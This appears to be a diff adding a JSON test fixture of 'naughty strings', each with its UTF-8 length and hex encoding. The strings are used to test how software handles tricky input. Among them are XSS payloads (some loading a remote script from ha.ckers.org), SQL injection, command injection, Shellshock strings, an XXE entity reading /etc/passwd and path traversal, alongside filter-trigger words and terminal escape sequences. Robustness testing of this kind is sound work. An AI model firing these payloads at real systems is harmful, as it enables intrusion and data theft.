+    "utf8Hex": "3c494d47205352433d23206f6e6d6f7573656f7665723d22616c65727428277878732729223e"
+  },
+  {
+    "input": "<IMG SRC= onmouseover=\"alert('xxs')\">",
+    "utf8Length": 37,
+    "utf8Hex": "3c494d47205352433d206f6e6d6f7573656f7665723d22616c65727428277878732729223e"
+  },
+  {
+    "input": "<IMG onmouseover=\"alert('xxs')\">",
+    "utf8Length": 32,
+    "utf8Hex": "3c494d47206f6e6d6f7573656f7665723d22616c65727428277878732729223e"
+  },
+  {
+    "input": "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
+    "utf8Length": 136,
+    "utf8Hex": "3c494d47205352433d26233130363b262339373b26233131383b262339373b26233131353b262339393b26233131343b26233130353b26233131323b26233131363b262335383b262339373b26233130383b26233130313b26233131343b26233131363b262334303b262333393b262338383b262338333b262338333b262333393b262334313b3e"
+  },
+  {
+    "input": "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
+    "utf8Length": 217,
+    "utf8Hex": "3c494d47205352433d2623303030303130362623303030303039372623303030303131382623303030303039372623303030303131352623303030303039392623303030303131342623303030303130352623303030303131322623303030303131362623303030303035382623303030303039372623303030303130382623303030303130312623303030303131342623303030303131362623303030303034302623303030303033392623303030303038382623303030303038332623303030303038332623303030303033392623303030303034313e"
+  },
+  {
+    "input": "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
+    "utf8Length": 125,
+    "utf8Hex": "3c494d47205352433d262378364126237836312623783736262378363126237837332623783633262378373226237836392623783730262378373426237833412623783631262378364326237836352623783732262378373426237832382623783237262378353826237835332623783533262378323726237832393e"
+  },
+  {
+    "input": "<IMG SRC=\"jav   ascript:alert('XSS');\">",
+    "utf8Length": 39,
+    "utf8Hex": "3c494d47205352433d226a6176202020617363726970743a616c657274282758535327293b223e"
+  },
+  {
+    "input": "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
+    "utf8Length": 42,
+    "utf8Hex": "3c494d47205352433d226a617626237830393b617363726970743a616c657274282758535327293b223e"
+  },
+  {
+    "input": "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
+    "utf8Length": 42,
+    "utf8Hex": "3c494d47205352433d226a617626237830413b617363726970743a616c657274282758535327293b223e"
+  },
+  {
+    "input": "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
+    "utf8Length": 42,
+    "utf8Hex": "3c494d47205352433d226a617626237830443b617363726970743a616c657274282758535327293b223e"
+  },
+  {
+    "input": "perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out",
+    "utf8Length": 62,
+    "utf8Hex": "7065726c202d6520277072696e7420223c494d47205352433d6a6176615c307363726970743a616c657274285c225853535c22293e223b27203e206f7574"
+  },
+  {
+    "input": "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
+    "utf8Length": 44,
+    "utf8Hex": "3c494d47205352433d2220262331343b20206a6176617363726970743a616c657274282758535327293b223e"
+  },
+  {
+    "input": "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
+    "utf8Length": 54,
+    "utf8Hex": "3c5343524950542f585353205352433d22687474703a2f2f68612e636b6572732e6f72672f7873732e6a73223e3c2f5343524950543e"
+  },
+  {
+    "input": "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
+    "utf8Length": 51,
+    "utf8Hex": "3c424f4459206f6e6c6f6164212324252628292a7e2b2d5f2e2c3a3b3f405b2f7c5c5d5e603d616c657274282258535322293e"
+  },
+  {
+    "input": "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
+    "utf8Length": 50,
+    "utf8Hex": "3c5343524950542f5352433d22687474703a2f2f68612e636b6572732e6f72672f7873732e6a73223e3c2f5343524950543e"
+  },
+  {
+    "input": "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
+    "utf8Length": 34,
+    "utf8Hex": "3c3c5343524950543e616c657274282258535322293b2f2f3c3c2f5343524950543e"
+  },
+  {
+    "input": "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >",
+    "utf8Length": 44,
+    "utf8Hex": "3c534352495054205352433d687474703a2f2f68612e636b6572732e6f72672f7873732e6a733f3c2042203e"
+  },
+  {
+    "input": "<SCRIPT SRC=//ha.ckers.org/.j>",
+    "utf8Length": 30,
+    "utf8Hex": "3c534352495054205352433d2f2f68612e636b6572732e6f72672f2e6a3e"
+  },
+  {
+    "input": "<IMG SRC=\"javascript:alert('XSS')\"",
+    "utf8Length": 34,
+    "utf8Hex": "3c494d47205352433d226a6176617363726970743a616c6572742827585353272922"
+  },
+  {
+    "input": "<iframe src=http://ha.ckers.org/scriptlet.html <",
+    "utf8Length": 48,
+    "utf8Hex": "3c696672616d65207372633d687474703a2f2f68612e636b6572732e6f72672f7363726970746c65742e68746d6c203c"
+  },
+  {
+    "input": "\\\";alert('XSS');//",
+    "utf8Length": 18,
+    "utf8Hex": "5c223b616c657274282758535327293b2f2f"
+  },
+  {
+    "input": "1;DROP TABLE users",
+    "utf8Length": 18,
+    "utf8Hex": "313b44524f50205441424c45207573657273"
+  },
+  {
+    "input": "1'; DROP TABLE users-- 1",
+    "utf8Length": 24,
+    "utf8Hex": "31273b2044524f50205441424c452075736572732d2d2031"
+  },
+  {
+    "input": "' OR 1=1 -- 1",
+    "utf8Length": 13,
+    "utf8Hex": "27204f5220313d31202d2d2031"
+  },
+  {
+    "input": "' OR '1'='1",
+    "utf8Length": 11,
+    "utf8Hex": "27204f52202731273d2731"
+  },
+  {
+    "input": "-",
+    "utf8Length": 1,
+    "utf8Hex": "2d"
+  },
+  {
+    "input": "--",
+    "utf8Length": 2,
+    "utf8Hex": "2d2d"
+  },
+  {
+    "input": "--version",
+    "utf8Length": 9,
+    "utf8Hex": "2d2d76657273696f6e"
+  },
+  {
+    "input": "--help",
+    "utf8Length": 6,
+    "utf8Hex": "2d2d68656c70"
+  },
+  {
+    "input": "$USER",
+    "utf8Length": 5,
+    "utf8Hex": "2455534552"
+  },
+  {
+    "input": "/dev/null; touch /tmp/blns.fail ; echo",
+    "utf8Length": 38,
+    "utf8Hex": "2f6465762f6e756c6c3b20746f756368202f746d702f626c6e732e6661696c203b206563686f"
+  },
+  {
+    "input": "`touch /tmp/blns.fail`",
+    "utf8Length": 22,
+    "utf8Hex": "60746f756368202f746d702f626c6e732e6661696c60"
+  },
+  {
+    "input": "$(touch /tmp/blns.fail)",
+    "utf8Length": 23,
+    "utf8Hex": "2428746f756368202f746d702f626c6e732e6661696c29"
+  },
+  {
+    "input": "@{[system \"touch /tmp/blns.fail\"]}",
+    "utf8Length": 34,
+    "utf8Hex": "407b5b73797374656d2022746f756368202f746d702f626c6e732e6661696c225d7d"
+  },
+  {
+    "input": "eval(\"puts 'hello world'\")",
+    "utf8Length": 26,
+    "utf8Hex": "6576616c282270757473202768656c6c6f20776f726c64272229"
+  },
+  {
+    "input": "System(\"ls -al /\")",
+    "utf8Length": 18,
+    "utf8Hex": "53797374656d28226c73202d616c202f2229"
+  },
+  {
+    "input": "`ls -al /`",
+    "utf8Length": 10,
+    "utf8Hex": "606c73202d616c202f60"
+  },
+  {
+    "input": "Kernel.exec(\"ls -al /\")",
+    "utf8Length": 23,
+    "utf8Hex": "4b65726e656c2e6578656328226c73202d616c202f2229"
+  },
+  {
+    "input": "Kernel.exit(1)",
+    "utf8Length": 14,
+    "utf8Hex": "4b65726e656c2e65786974283129"
+  },
+  {
+    "input": "%x('ls -al /')",
+    "utf8Length": 14,
+    "utf8Hex": "257828276c73202d616c202f2729"
+  },
+  {
+    "input": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
+    "utf8Length": 138,
+    "utf8Hex": "3c3f786d6c2076657273696f6e3d22312e302220656e636f64696e673d2249534f2d383835392d31223f3e3c21444f435459504520666f6f205b203c21454c454d454e5420666f6f20414e59203e3c21454e54495459207878652053595354454d202266696c653a2f2f2f6574632f70617373776422203e5d3e3c666f6f3e267878653b3c2f666f6f3e"
+  },
+  {
+    "input": "$HOME",
+    "utf8Length": 5,
+    "utf8Hex": "24484f4d45"
+  },
+  {
+    "input": "$ENV{'HOME'}",
+    "utf8Length": 12,
+    "utf8Hex": "24454e567b27484f4d45277d"
+  },
+  {
+    "input": "%d",
+    "utf8Length": 2,
+    "utf8Hex": "2564"
+  },
+  {
+    "input": "%s",
+    "utf8Length": 2,
+    "utf8Hex": "2573"
+  },
+  {
+    "input": "%*.*s",
+    "utf8Length": 5,
+    "utf8Hex": "252a2e2a73"
+  },
+  {
+    "input": "../../../../../../../../../../../etc/passwd%00",
+    "utf8Length": 46,
+    "utf8Hex": "2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f6574632f706173737764253030"
+  },
+  {
+    "input": "../../../../../../../../../../../etc/hosts",
+    "utf8Length": 42,
+    "utf8Hex": "2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f6574632f686f737473"
+  },
+  {
+    "input": "() { 0; }; touch /tmp/blns.shellshock1.fail;",
+    "utf8Length": 44,
+    "utf8Hex": "2829207b20303b207d3b20746f756368202f746d702f626c6e732e7368656c6c73686f636b312e6661696c3b"
+  },
+  {
+    "input": "() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }",
+    "utf8Length": 58,
+    "utf8Hex": "2829207b205f3b207d203e5f5b2428242829295d207b20746f756368202f746d702f626c6e732e7368656c6c73686f636b322e6661696c3b207d"
+  },
+  {
+    "input": "CON",
+    "utf8Length": 3,
+    "utf8Hex": "434f4e"
+  },
+  {
+    "input": "PRN",
+    "utf8Length": 3,
+    "utf8Hex": "50524e"
+  },
+  {
+    "input": "AUX",
+    "utf8Length": 3,
+    "utf8Hex": "415558"
+  },
+  {
+    "input": "CLOCK$",
+    "utf8Length": 6,
+    "utf8Hex": "434c4f434b24"
+  },
+  {
+    "input": "NUL",
+    "utf8Length": 3,
+    "utf8Hex": "4e554c"
+  },
+  {
+    "input": "A:",
+    "utf8Length": 2,
+    "utf8Hex": "413a"
+  },
+  {
+    "input": "ZZ:",
+    "utf8Length": 3,
+    "utf8Hex": "5a5a3a"
+  },
+  {
+    "input": "COM1",
+    "utf8Length": 4,
+    "utf8Hex": "434f4d31"
+  },
+  {
+    "input": "LPT1",
+    "utf8Length": 4,
+    "utf8Hex": "4c505431"
+  },
+  {
+    "input": "LPT2",
+    "utf8Length": 4,
+    "utf8Hex": "4c505432"
+  },
+  {
+    "input": "LPT3",
+    "utf8Length": 4,
+    "utf8Hex": "4c505433"
+  },
+  {
+    "input": "COM2",
+    "utf8Length": 4,
+    "utf8Hex": "434f4d32"
+  },
+  {
+    "input": "COM3",
+    "utf8Length": 4,
+    "utf8Hex": "434f4d33"
+  },
+  {
+    "input": "COM4",
+    "utf8Length": 4,
+    "utf8Hex": "434f4d34"
+  },
+  {
+    "input": "Scunthorpe General Hospital",
+    "utf8Length": 27,
+    "utf8Hex": "5363756e74686f7270652047656e6572616c20486f73706974616c"
+  },
+  {
+    "input": "Penistone Community Church",
+    "utf8Length": 26,
+    "utf8Hex": "50656e6973746f6e6520436f6d6d756e69747920436875726368"
+  },
+  {
+    "input": "Lightwater Country Park",
+    "utf8Length": 23,
+    "utf8Hex": "4c69676874776174657220436f756e747279205061726b"
+  },
+  {
+    "input": "Jimmy Clitheroe",
+    "utf8Length": 15,
+    "utf8Hex": "4a696d6d7920436c69746865726f65"
+  },
+  {
+    "input": "Horniman Museum",
+    "utf8Length": 15,
+    "utf8Hex": "486f726e696d616e204d757365756d"
+  },
+  {
+    "input": "shitake mushrooms",
+    "utf8Length": 17,
+    "utf8Hex": "73686974616b65206d757368726f6f6d73"
+  },
+  {
+    "input": "RomansInSussex.co.uk",
+    "utf8Length": 20,
+    "utf8Hex": "526f6d616e73496e5375737365782e636f2e756b"
+  },
+  {
+    "input": "http://www.cum.qc.ca/",
+    "utf8Length": 21,
+    "utf8Hex": "687474703a2f2f7777772e63756d2e71632e63612f"
+  },
+  {
+    "input": "Craig Cockburn, Software Specialist",
+    "utf8Length": 35,
+    "utf8Hex": "437261696720436f636b6275726e2c20536f667477617265205370656369616c697374"
+  },
+  {
+    "input": "Linda Callahan",
+    "utf8Length": 14,
+    "utf8Hex": "4c696e64612043616c6c6168616e"
+  },
+  {
+    "input": "Dr. Herman I. Libshitz",
+    "utf8Length": 22,
+    "utf8Hex": "44722e204865726d616e20492e204c6962736869747a"
+  },
+  {
+    "input": "magna cum laude",
+    "utf8Length": 15,
+    "utf8Hex": "6d61676e612063756d206c61756465"
+  },
+  {
+    "input": "Super Bowl XXX",
+    "utf8Length": 14,
+    "utf8Hex": "537570657220426f776c20585858"
+  },
+  {
+    "input": "medieval erection of parapets",
+    "utf8Length": 29,
+    "utf8Hex": "6d6564696576616c206572656374696f6e206f66207061726170657473"
+  },
+  {
+    "input": "evaluate",
+    "utf8Length": 8,
+    "utf8Hex": "6576616c75617465"
+  },
+  {
+    "input": "mocha",
+    "utf8Length": 5,
+    "utf8Hex": "6d6f636861"
+  },
+  {
+    "input": "expression",
+    "utf8Length": 10,
+    "utf8Hex": "65787072657373696f6e"
+  },
+  {
+    "input": "Arsenal canal",
+    "utf8Length": 13,
+    "utf8Hex": "417273656e616c2063616e616c"
+  },
+  {
+    "input": "classic",
+    "utf8Length": 7,
+    "utf8Hex": "636c6173736963"
+  },
+  {
+    "input": "Tyson Gay",
+    "utf8Length": 9,
+    "utf8Hex": "5479736f6e20476179"
+  },
+  {
+    "input": "If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you.",
+    "utf8Length": 211,
+    "utf8Hex": "496620796f752772652072656164696e6720746869732c20796f75277665206265656e20696e206120636f6d6120666f7220616c6d6f7374203230207965617273206e6f772e20576527726520747279696e672061206e657720746563686e697175652e20576520646f6e2774206b6e6f772077686572652074686973206d6573736167652077696c6c20656e6420757020696e20796f757220647265616d2c2062757420776520686f706520697420776f726b732e20506c656173652077616b652075702c207765206d69737320796f752e"
+  },
+  {
+    "input": "Roses are \u001b[0;31mred\u001b[0m, violets are \u001b[0;34mblue. Hope you enjoy terminal hue",
+    "utf8Length": 78,
+    "utf8Hex": "526f73657320617265201b5b303b33316d7265641b5b306d2c2076696f6c65747320617265201b5b303b33346d626c75652e20486f706520796f7520656e6a6f79207465726d696e616c20687565"
+  },
+  {
+    "input": "But now...\u001b[20Cfor my greatest trick...\u001b[8m",
+    "utf8Length": 43,
+    "utf8Hex": "427574206e6f772e2e2e1b5b323043666f72206d7920677265617465737420747269636b2e2e2e1b5b386d"
+  },
+  {
+    "input": "The quic\b\b\b\b\b\bk brown fo\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007x... [Beeeep]",
+    "utf8Length": 48,
+    "utf8Hex": "54686520717569630808080808086b2062726f776e20666f0707070707070707070707782e2e2e205b4265656565705d"
+  },
+  {
+    "input": "Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗",
+    "utf8Length": 61,
+    "utf8Hex": "506f776572d984d98fd984d98fd8b5d991d8a8d98fd984d98fd984d8b5d991d8a8d98fd8b1d8b1d98b20e0a5a320e0a5a36820e0a5a320e0a5a3e58697"
+  }
+]
